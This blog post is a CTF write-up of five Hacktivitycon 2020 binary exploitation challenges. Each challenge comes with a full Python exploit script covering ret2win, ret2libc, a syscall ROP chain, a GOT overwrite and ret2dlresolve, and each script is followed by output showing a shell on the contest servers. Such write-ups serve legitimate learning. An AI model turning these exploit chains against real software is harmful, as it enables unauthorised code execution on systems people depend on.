---
layout:     post
title:      "Hacktivitycon - Pwn challenges"
subtitle:   "Write-Up"
date:       2020-08-01 
author:     "D4mianwayne"
img:       "/img/banner/hacktivity.png"
tag:      pwn, roppy, ret2dlresolve
category: CTF writeup
---


I played this CTF mainly because I was chilling out and wanted to try out some challenges from the CTF. I managed to do the every pwn challenge except space one which was heap and the exploitation mechanism of it belongs to GLIBC 2.27 and I am only familiar with GLIBC 2.24 at the moment, but I know what to do this week,

# Pancake


Pancake challenge was very simple as the buffer overflow was very suspectible as the binary used the `gets` function which is a vulnerable function as it'll keep taking the input a new line `\n` is encountered. To our luck, the binary has a function named `secret` which spawns a shell for us. This was basically a **ret2win** technique.

The main function looks like:-

```C
undefined8 main(void)

{
  char desired_pancakes_str [128];
  int desired_pancakes;
  int tick_2;
  int tick_1;
  int tick_0;
  
  desired_pancakes = 0;
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("Welcome to the pancake stacker!");
  puts("How many pancakes do you want?");
  gets(desired_pancakes_str); /* Vulnerable */

  -- snip --
  return 0;
}
```

The offset to RIP is `152` because:
* We have a variable type char of size `128`
* 4 integers variables declared afterwars that means, `sizeof(int) * 4` which is `16` 
* Adding the size of variables will be `144` and adding `8` to it we get `152` which is the offset.

The exploit:-

```py
from roppy import *

elf = ELF("pancake")
p = process("./binary")

payload = b"A"*152
payload += p64(elf.function('secret_recipe'))
p.sendline(payload)

# FLAG:  flag{too_many_pancakes_on_the_stack}

p.interactive()
```

# Almost

This challenge was simple ret2libc attack and the binary used strcat to add 3 different buffer to single buffer which made it suspectible to buffer overflow as the 3 different buffer will be able to overflow the buffer `s` where all of those were being concatenated. Although, giving large buffer to all 3 different inputs will result in segfault in internal `strcat` function of LIBC.

```C
int build()
{
  char src; // [esp+0h] [ebp-1C8h]
  char v2; // [esp+40h] [ebp-188h]
  char v3; // [esp+80h] [ebp-148h]
  char s[264]; // [esp+C0h] [ebp-108h]

  memset(s, 0, 0x100u);
  puts("Insert the protocol:");
  getInput(&src);
  puts("Insert the domain:");
  getInput(&v2);
  puts("Insert the path:");
  getInput(&v3);
  strcat(s, &src);
  *(_DWORD *)&s[strlen(s)] = 3092282;
  strcat(s, &v2);
  *(_WORD *)&s[strlen(s)] = 47;
  strcat(s, &v3);
  puts("Result:");
  return puts(s);
}
```

Here, we see that memset fills the variable `s` with `0` and then takes input via `getInput` which is a custom read function which takes upto 64 bytes with the `getchar` and then checks if the number of input is more than 64. When we send 64 bytes to first and second buffer and send 63 bytes we get segfault and control over EIP.

So, from here it was just as simple as doing a 32 bit ret2libc, since LIBC wasn't provided I leaked the `puts` address and used the libc database.

```py
from roppy import *

p = remote("jh2i.com", 50017)

elf = ELF("almost")
libc = ELF("libc6-i386_2.27-3ubuntu1.2_amd64.so")

def protocol():
    p.sendlineafter(":\n", "A"*64)

def domain():
    p.sendlineafter(":\n", "B"*64)

def path(payload):
    payload = payload.ljust(63, b"c")
    p.sendlineafter(":\n", payload)


protocol()
domain()

payload = b"A"*10
payload += p32(elf.plt("puts"))      # function 
payload += p32(elf.function("main")) # return address
payload += p32(elf.got("puts"))      # arg1

path(payload)

p.recvline()
p.recvline()
leak = u32(p.recv(4))
log.info("puts@GOT:   0x%x" %(leak))
libc.address = leak - libc.function("puts")

protocol()
domain()

payload = b"A"*10
payload += p32(libc.function("system"))
payload += p32(0xdeadbeef)

payload += p32(libc.search(b"/bin/sh\x00"))

path(payload)

p.interactive()
```

Running te exploit:-

```r
0 [07:43:53] vagrant@oracle(oracle) pwn> python3 almost.py 
[+] Opening connection to jh2i.com on port 50017: Done
[*] Analyzing /home/vagrant/CTFs/hacktivity/pwn/almost
[*] Analyzing /home/vagrant/CTFs/hacktivity/pwn/libc6-i386_2.27-3ubuntu1.2_amd64.so
[*] puts@GOT:   0xf7d8b3d0
[*] Switching to interactive mode
Result:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAA\x80��ﾭޏ���ccccccccccccccccccccccccccccccccccccccccc://BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAA\x80��ﾭޏ���ccccccccccccccccccccccccccccccccccccccccc/ls
almost    almost.c  flag.txt
$ cat flag.txt
flag{my_code_was_almost_secure}$ 
$ 
[*] Interrupted
[*] Closed connection to jh2i.com port 50017
```

# sad 

This was a statically linked binary and it had a stack overflow vulnerability and since it was statically linked no ret2libc could be done, I chose the ROP way to do a `read` syscall to store `/bin/sh` in BSS address and then did a `execve`syscall. As it was statically linked binary, we had every needed gadget this made it simple to exploit:-


Exploit:-

```py
from roppy import *

p = remote("jh2i.com", 50002)

# flag{radically_statically_roppingly_vulnerable}


pop_rdi = p64(0x40187a)
syscall = p64(0x40eda4)
pop_rdx = p64(0x40177f)
pop_rsi = p64(0x407aae)
pop_rax = p64(0x43f8d7)
bss     = p64(0x4ae310)

payload = b"a"*264

# The read syscall
payload += pop_rdi   
payload += p64(0)
payload += pop_rsi
payload += bss
payload += pop_rdx
payload += p64(0x8)
payload += pop_rax
payload += p64(0x0)
payload += syscall

# The execve syscall payload: execve(bss, 0, 0)

payload += pop_rdi
payload += bss
payload += pop_rsi
payload += p64(0x0)
payload += pop_rdx
payload += p64(0x0)
payload += pop_rax
payload += p64(59)
payload += syscall


p.recvline()
p.sendline(payload)

# Sedding `/bin/sh` and then the execve syscall will 
p.sendline("/bin/sh\x00")


p.interactive()
```

Running the exploit:-

```r
0 [07:44:40] vagrant@oracle(oracle) pwn> python3 sad.py 
[+] Opening connection to jh2i.com on port 50002: Done
[*] Switching to interactive mode
$ ls
flag.txt
sad
$ cat flag.txt
flag{radically_statically_roppingly_vulnerable}
$ 
[*] Interrupted
[*] Closed connection to jh2i.com port 50002
```

> Reference: <https://pwning.tech/2020/03/09/zer0pts-hipwn/>

# Bullseye


This challenge was quite good and I liked it, it provided us a write-what-where primitive as a service and since the binary has Partial RELRO which means GOT entry was writeable, such a handy information. It was also leaking the alarm libc address which made it simple for us to get LIBC address by searching it ftro libc database.

```r
[*] '/home/vagrant/CTF/hacktivitycon/pwn/bullseye'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
Exploit:-

```r
from roppy import *
from time import sleep

# flag{one_write_two_write_good_write_bad_write}

HOST = "jh2i.com"
PORT = 50031


libc = ELF("libc6_2.30-0ubuntu2.1_amd64.so")
exit_got  = "0x404058"
sleep_got = "0x404060"
main      = "0x401260"
read_got  = "0x404038"

p = remote(HOST, PORT)

def send_data(where, what):
        p.sendlineafter("?\n", where)
        p.sendlineafter("?\n", what)


send_data(exit_got, main)
sleep(0xf)
alarm = int(p.recvline().strip(b"\n"), 16)
log.info("alarm:  0x%x" %(alarm))
libc.address = alarm - libc.function("alarm")
log.info("LIBC  :  0x%x" %(libc.address))
log.info("system:  0x%x" %(libc.function("system")))
send_data(sleep_got, main)

send_data("0x404040", hex(libc.function("system")))

p.interactive()
```

Running the exploit:-

```r
0 [07:40:13] vagrant@oracle(oracle) pwn> python3 bullseye.py 
[*] Analyzing /home/vagrant/CTFs/hacktivity/pwn/libc6_2.30-0ubuntu2.1_amd64.so
[+] Opening connection to jh2i.com on port 50031: Done
[*] alarm:  0x7fbca7ea8be0
[*] LIBC  :  0x7fbca7dc3000
[*] system:  0x7fbca7e184e0
[*] Paused [Press any key to continue]
[*] Switching to interactive mode
You have one write, don't miss.

Where do you want to write to?
$ /bin/sh
$ cat flag.txt
flag{one_write_two_write_good_write_bad_write}
$ exit
sh: 2: �@: not found
What do you want to write?
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to jh2i.com port 50031
```

# Bacon

This is quite a good challenge. We were given a binary and it had a stackoverflow vulnerability, the program was:-

```C
int main()
{
  char buf[1036];
  read(0, buf, 1056)
}
```

Although, it had stackoverflow vulnerability I couldn't get to understand how to pwn this, since there wasn't anything to leak any address so the ret2libc was out of option here, then I thought of ret2dl_resolve, this technique I learned about does not require any address leak, it will exploit the `dl_runtime_resolve` to exploit the link map of the functions. Using pwntools's ROP module, it was a piece of cake.

Exploit:-

```py
from pwn import *


p = remote("jh2i.com", 50032)

rop = ROP("bacon")
elf = ELF("bacon")

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

raw_rop = rop.chain()

pause()
payload = b"A"*1036
payload += raw_rop
payload += dlresolve.payload

p.send(payload)
p.interactive()
```

Running the exploit:-

```r
0 [07:39:10] vagrant@oracle(oracle) pwn> python3 bacon.py 
[+] Opening connection to jh2i.com on port 50032: Done
[*] '/home/vagrant/CTFs/hacktivity/pwn/bacon'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loading gadgets for '/home/vagrant/CTFs/hacktivity/pwn/bacon'
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ ls
bacon
flag.txt
$ cat flag.txt
flag{don't_forget_to_take_out_the_grease}
$ 
[*] Interrupted
```
> Reference: <https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62>

That was it, I wish I did space too. But I couldn't, so I am gonna do it later today as I took some help from someone who did the challenge. In case, you need help just message me on twitter.